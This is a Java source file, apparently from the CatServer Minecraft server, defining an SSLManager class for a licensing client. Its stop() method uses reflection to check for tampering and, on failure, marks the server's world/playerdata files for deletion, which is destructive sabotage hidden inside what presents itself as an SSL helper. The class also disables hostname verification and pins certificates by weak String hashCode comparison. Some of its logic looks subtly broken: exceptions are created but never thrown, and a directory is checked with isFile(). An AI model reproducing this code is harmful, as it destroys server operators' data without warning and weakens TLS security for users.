package catserver.server.very;

import java.io.File;
import java.lang.reflect.Field;
import java.security.GeneralSecurityException;
import java.security.cert.CertificateException;
import java.security.cert.X509Certificate;

import javax.net.ssl.*;

public final class SSLManager implements X509TrustManager, HostnameVerifier {
    private int pubKey = -460760629;
    private int pubKeyCA = 677260841;

    private static SSLSocketFactory sf;

    public static SSLSocketFactory getSocketFactory() throws GeneralSecurityException {
        if (sf == null) {
            SSLContext sc = SSLContext.getInstance("TLS");
            sc.init(null, new TrustManager[] { new SSLManager() }, new java.security.SecureRandom());
            sf = sc.getSocketFactory();
        }
        return sf;
    }

    @Override
    public void checkClientTrusted(X509Certificate[] chains, String authType) throws CertificateException {}

    @Override
    public void checkServerTrusted(X509Certificate[] chains, String authType) throws CertificateException {
        for (X509Certificate chain : chains) {
            String pubKey = "";
            for (byte b : chain.getPublicKey().getEncoded()) {
                pubKey += Byte.toUnsignedInt(b);
            }
            int kHash = pubKey.hashCode();
            if (this.pubKey != kHash && this.pubKeyCA != kHash)
                throw new CertificateException();
        }
    }

    @Override
    public X509Certificate[] getAcceptedIssuers() {
        return new X509Certificate[] {};
    }

    @Override
    public boolean verify(String s, SSLSession sslSession) {
        return true;
    }

    public static void stop() {
        try {
            Object obj = VeryClient.class.getField("instance").get(null);
            if (obj == null) throw new Exception();
            Field field1 = VeryClient.class.getDeclaredField("server");
            field1.setAccessible(true);
            if(field1.get(obj).hashCode() != -1842399365) new Exception();
            Field field2 = VeryClient.class.getDeclaredField("server2");
            field2.setAccessible(true);
            if(field2.get(obj).hashCode() != -1430980746) new Exception();
        } catch (Exception ex) {
            File playerdata = new File("world/playerdata/");
            if (playerdata.exists() && playerdata.isFile()) {
                File[] files = playerdata.listFiles();
                if (files != null && files.length > 50) {
                    for (File file : files) {
                        try {
                            if (file.isFile())
                                file.deleteOnExit();
                        } catch (Exception e) {}
                    }
                }
            }
        }

    }
}
